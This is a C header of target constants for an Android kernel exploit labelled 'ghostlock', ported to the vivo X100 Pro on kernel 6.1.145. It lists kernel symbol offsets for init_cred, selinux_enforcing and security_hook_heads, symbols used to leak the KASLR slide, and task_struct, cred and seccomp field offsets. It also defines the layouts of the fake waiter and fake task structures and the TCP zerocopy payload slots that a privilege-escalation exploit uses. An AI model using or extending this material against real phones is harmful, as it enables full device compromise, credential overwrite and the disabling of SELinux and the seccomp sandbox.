#ifndef TARGET_H
#define TARGET_H

/* vivo X100 Pro (PD2324 / V2324A), 6.1.145-android14-11-maybe-dirty
 *
 * Diff vs src/core/target.h (ghostlock_oplus):
 *   - KIMAGE_TEXT_BASE  0xffffffc080000000 -> 0xffffffc008000000
 *   - P0_KERNEL_PHYS_LOAD 0xa8000000 -> 0x80000000 (MTK DRAM base, matches the
 *     6.1.145 offsets entry .kernel_phys_load; publish_active_offsets() also
 *     overwrites p0_kernel_phys_load from the runtime table, this is a fallback)
 *   - the compile-time _OFF fallbacks are X100 Pro kallsyms values so that a
 *     missing/partial offsets.json cannot silently point at the wrong symbol
 *   - task_struct field defaults switched to the 6.1 layout (runtime
 *     STRUCT_OFFSETS_6_1 already overrides them; kept consistent for audits)
 * Everything else is identical: the exploit geometry (fake waiter / fake task
 * / TCP payload slots) does not move between these two devices.
 */

#define BUILD_VARIANT_LABEL "ghostlock_x100pro"

/* Kernel address layout. */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define MTK_VADDR_BASE 0xffffffc000000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
#define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Symbol offsets (X100 Pro kallsyms, _text = 0xffffffc008000000). */
#define INIT_TASK_OFF 0x0210fb40ULL
#define INIT_CRED_OFF 0x02122430ULL
#define ROOT_TASK_GROUP_OFF 0x0234a740ULL
#define SELINUX_ENFORCING_OFF 0x0247fb98ULL
#define SELINUX_BLOB_SIZES_OFF 0x016335e0ULL
#define SECURITY_HOOK_HEADS_OFF 0x01632ed0ULL

/* KASLR leak symbols. */
#define SLIDE_NFULNL_LOGGER_OFF 0x02102ee0ULL
#define SLIDE_LOGGERS_0_1_OFF 0x02102e28ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02276810ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x024a1190ULL

/* Kernel addresses. */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define PSELECT_WAITER_WORD_SHIFT -2

/* struct tracepoint.funcs offset within the struct, per KMI.
 * 6.1: size 0x48 -> funcs @ +0x40.  6.6: size 0x50 -> funcs @ +0x48.
 * On-device: __tracepoint_sys_enter 0x...35b8, __tracepoint_sys_exit 0x...3600. */
#define TRACEPOINT_FUNCS_OFF_6_1 0x40
#define TRACEPOINT_FUNCS_OFF_6_6 0x48

/* Fake waiter and task layouts. */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

#define TASK_PID_OFF 0x630
#define TASK_TGID_OFF 0x634
#define TASK_ATOMIC_FLAGS_OFF 0x5f0
#define TASK_REAL_CRED_OFF 0x830
#define TASK_CRED_OFF 0x838
#define TASK_COMM_OFF 0x848
#define TASK_TASKS_OFF 0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x900

#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define LOCK_OFF 0x0E80
#define W0_OFF 0x1180
#define FOPS_OFF 0x0F80
#define RIGHT_OFF 0x1240
#define LEFT_OFF 0x1260
#define FAKE_TASK_OFF 0x1280

/* W2 payload. */
#define CRED_COPY_OFF 0x1080

/* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
 * fake_lock rb_leftmost zone; the cred copy follows because the pselect
 * 0x1080 slot would land inside fake_task. */
#define TCP_FAKE_TASK_OFF 0x5800
#define TCP_CRED_COPY_OFF 0x6800

#endif
